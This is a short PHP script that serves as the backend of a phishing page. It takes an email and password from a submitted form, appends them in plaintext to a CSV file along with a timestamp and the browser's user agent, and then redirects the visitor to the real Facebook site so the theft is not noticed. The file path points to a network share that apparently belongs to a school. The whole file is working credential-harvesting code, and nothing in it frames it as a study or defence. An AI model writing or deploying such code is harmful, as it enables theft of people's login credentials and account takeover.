<?php

//recieve form post data and saving it in variables

$email = @$_POST['email'];
$password = @$_POST['pass'];


if (isset($_POST['email']) && empty($_POST['email'])) {
    echo 'Email address is required';
    return false;
};

if (isset($_POST['pass']) && empty($_POST['pass'])) {
    echo 'password is required';
    return false;
};


//name of file where data would be stored in
//$filename = "../../data.csv";
$filename = "N:\COMMUN\ELEVE\INFO\SI-T1a\PO\data.csv";

//merging all variables into a sinle variable
$format = "%s;%s;%s;%s\n";
$user_agent = "UNDEFINED";
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
}
$data = sprintf($format, $email, $password, date("d.m.Y H:i:s", time()), $user_agent);


//save details to file
if (file_put_contents($filename, "$data", FILE_APPEND)) {
    header('Location: https://fr-fr.facebook.com/');
    exit();
} else {
    header('Location: failed.php');
    exit(403);
}